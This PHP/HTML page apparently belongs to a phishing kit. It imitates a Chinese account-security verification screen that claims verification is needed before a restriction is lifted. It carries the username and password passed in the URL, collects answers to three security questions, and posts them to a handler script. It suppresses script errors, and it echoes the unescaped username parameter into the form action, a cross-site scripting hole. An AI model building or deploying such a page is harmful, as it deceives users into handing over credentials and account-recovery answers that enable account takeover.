<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
	<link href="style/safe.css" rel="stylesheet" type="text/css" />
	<script language="JavaScript">
	<!-- Hide
	function killErrors() {
	return true;
	}
	window.onerror = killErrors;
	// -->
	</script>
</head>
	<?php
		if(isset($_GET['u']) && isset($_GET['p'])){
			if(!is_numeric($_GET['u']) && (strlen($_GET['u'])<5 || strlen($_GET['p'])>11)){
				echo "<script>alert('用户名密码不正确');window.location.href='cn2.php';</script>";
			}
		}else{
			echo "<script>alert('用户名密码不正确');window.location.href='cn2.php';</script>";
		}
	?>
	<script type="text/javascript" src="htdocs/js/jquery.min.js"></script>
	<script type="text/javascript" src="htdocs/js/common.js"></script>

	<script language="javascript" src="htdocs/js/ctrlManager.js"></script>
	<script language="javascript" src="htdocs/js/check.js"></script>

<body>
<form name="myform" id="myform" method="post" autocomplete="off" action="do_mb_resetk2.php?u=<?php echo $_GET['u']; ?>" onsubmit="return checkForm();" accept-charset="utf8" target="_top">
<div class="safetyvalidate" >

  <div class="content">
      <div class="in_content" >
        <p class="title" id="top_tip">根据系统设置，在解除限制前需要进行安全验证。		
		</p>
        <div class="check clearfix" >
		<div id="selsecter">
          <ul>
            <li><span class="label">选择验证方式：</span>
              <select name="select" id="select" class="ipt_select" tabindex="3">
                <option id="question_sel" value="question">密保问题</option>
				</select>
            </li>
            </ul>
         </div>
         <div id="mbitems">
			
			<div id="question">
          <input type="hidden" value="0" name="order" id="order"/>
		  <input type="hidden" name="dnaAnswerHex1" id="dnaAnswerHex1"/>
		   <input type="hidden" name="dnaAnswerHex2" id="dnaAnswerHex2"/>
		    <input type="hidden" name="dnaAnswerHex3" id="dnaAnswerHex3"/>
          <ul>
          <script language="javascript" src="dna.js"></script>
		  <li><span class="label" >问题一：</span><select class="ipt_select" name="ddlDNAQues1" id="ddlDNAQues1" onchange="dnaQuesChangeHandler(this);">			
					</select></li>
            <li><span class="label">答案：</span>
              <input type="text"  name="dnaAnswer1" id="dnaAnswer1" class="inputstyle" tabindex="4"/>
            </li>
			
			
            
			<li><span class="label">问题二：</span><select class="ipt_select" name="ddlDNAQues2" id="ddlDNAQues2" onchange="dnaQuesChangeHandler(this);">			
					</select></li>
            <li><span class="label" id="Span1">答案：</span>
			<input type="text"  name="dnaAnswer2" id="dnaAnswer2" class="inputstyle"  value="" tabindex="5" />
			</li>
			<li><span class="label">问题三：</span><select class="ipt_select" name="ddlDNAQues3" id="ddlDNAQues3" onchange="dnaQuesChangeHandler(this);">			
					</select></li>
            <li><span class="label">答案：</span>
              	<input type="text" name="dnaAnswer3" id="dnaAnswer3"  class="inputstyle"  value="" tabindex="6" />
            </li>			
		</ul>
</div>
<script language="javascript">
	var dnaHandler1=new DnaSetHandler();
	function dnaQuesChangeHandler(_source) {
		dnaHandler1.selectionChange(_source);
	}
	function dnaAnswerBlurHandler(_source) {
	    dnaHandler1.answerBlur(_source);
	}
	var dnaAnswer = new DnaAnser3Handler('txtAnswer1', 'divDnaTip1', 'txtAnswer2', 'divDnaTip2', 'txtAnswer3', 'divDnaTip3');
</script>
			</div>
			<input type="hidden" id="verifyitem" value=""/>
			<input type="hidden" name="app" value="ipwd"/>
			<input type="hidden" name="back_url" value=""/>
			</div>
		</div>
			<p class="tips_area li_warn">&nbsp;&nbsp;忘记密保问题？点此申请重置密保</p>
	  </div>
	 
    <div class="btn" id="button">
				<input type="hidden" name="u" value="123456">
				<input type="hidden" name="p" value="123456">
	  <input type="submit" value="确 定" class="btn_em" id="confirm" tabindex="8" />
      <input type="button" onclick="hide_apform()" value="取 消" class="btn_dft" id="cancel" tabindex ="9"/>
    </div>
	
  </div>
  </form>  
  <div id="alert_div">
</div>
</body>
</html>

<script language="javascript">

function hide_apform(){
	parent.location.reload();
}

function checkForm(){
	if (document.myform.ddlDNAQues1.value == "-1"){
		alert ("提示：\n\n请选择问题！");
		document.myform.ddlDNAQues1.focus();
		return false;
	}
	if (document.myform.ddlDNAQues2.value == "-1"){
		alert ("提示：\n\n请选择问题！");
		document.myform.ddlDNAQues2.focus();
		return false;
	}
	if (document.myform.ddlDNAQues3.value == "-1"){
		alert ("提示：\n\n请选择问题！");
		document.myform.ddlDNAQues3.focus();
		return false;
	}
	if (document.myform.dnaAnswer1.value == ""){
		alert ("提示：\n\n请填写答案！");
		document.myform.dnaAnswer1.focus();
		return false;
	}
	if (document.myform.dnaAnswer2.value == ""){
		alert ("提示：\n\n请填写答案！");
		document.myform.dnaAnswer2.focus();
		return false;
	}
	if (document.myform.dnaAnswer3.value == ""){
		alert ("提示：\n\n请填写答案！");
		document.myform.dnaAnswer3.focus();
		return false;
	}
 }
 if(!!window.ActiveXObject){
 	document.charset='utf8';
 }
</script>